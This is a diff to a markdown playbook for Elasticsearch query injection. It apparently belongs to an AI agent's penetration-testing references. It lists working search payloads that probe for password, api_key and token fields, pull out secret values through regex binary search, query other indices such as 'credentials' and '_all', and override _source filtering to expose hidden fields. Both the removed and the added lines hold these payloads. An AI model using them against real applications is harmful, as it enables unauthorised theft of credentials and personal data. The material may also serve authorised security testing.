@@ -85,50 +85,25 @@ search=sensitive data") OR ("1"="1
 
 ### 2.2 Field Enumeration
 
-The highest-value attack: discovering and reading fields the search UI never exposes.
+The highest-value attack: discovering and reading fields the search UI never exposes. Full payload library in `agent/references/payloads/elasticsearch-injection-payloads.md` § "Field Enumeration Payloads."
 
+**Quick probe (confirm field-qualified queries work):**
 ```
-# Probe for common sensitive fields
 search=password:*
-search=secret:*
-search=api_key:*
-search=token:*
-search=ssn:*
-search=credit_card:*
-search=internal_notes:*
-search=admin_notes:*
-
-# Wildcard field discovery
-search=pass*:*
-search=*key*:*
-search=*secret*:*
-search=*token*:*
-
-# Field existence check (returns docs that have the field)
-search=_exists_:password
 search=_exists_:api_key
-search=_exists_:internal_id
+search=pass*:*
 ```
 
-**Interpretation**: If `search=password:*` returns different results than `search=xyznonexistent:*`, the `password` field exists and is searchable.
+**Interpretation**: If `search=password:*` returns different results than `search=xyznonexistent:*`, the `password` field exists and is searchable. Once confirmed, iterate the full sensitive field list from the reference.
 
 ### 2.3 Data Extraction via Field Queries
 
-Once a sensitive field is confirmed to exist:
+Once a sensitive field is confirmed to exist, extract values using regex binary search (full extraction methodology in the reference § "Data Extraction Payloads"):
 
 ```
-# Extract values character by character using regex
-search=password:/a.*/
-search=password:/ab.*/
-search=password:/abc.*/
-
-# Range queries for numeric/date fields
-search=salary:[50000 TO 100000]
-search=created_at:[2024-01-01 TO 2024-12-31]
-
-# Exact match extraction
-search=email:"admin@company.com"
-search=role:"superadmin"
+search=password:/^[a-m].*/     → narrow first character range
+search=password:/^[a-g].*/     → binary search continues
+search=salary:[50000 TO 100000] → range queries for numeric fields
 ```
 
 ### 2.4 Cross-Index Access
@@ -136,28 +111,17 @@ search=role:"superadmin"
 If the application doesn't restrict which indices the query hits:
 
 ```
-# Try querying other indices (if query routing is by URL param or body field)
-search=*&index=users
-search=*&index=credentials
-search=*&index=audit_log
-search=*&index=.kibana
-
-# _all index (searches across all indices)
 search=*&index=_all
+search=*&index=credentials
 ```
 
 ### 2.5 Source Filtering Injection
 
-If the application uses `_source` filtering to limit returned fields:
+Override `_source` filtering to read hidden fields:
 
 ```
-# Try overriding source filter via query params
 ?search=test&_source=password,api_key,secret
 ?search=test&_source_includes=*
-?search=test&_source_excludes=
-
-# In JSON body if the search endpoint accepts POST
-{"query": {"query_string": {"query": "*"}}, "_source": ["password", "token", "secret"]}
 ```
 
 ---
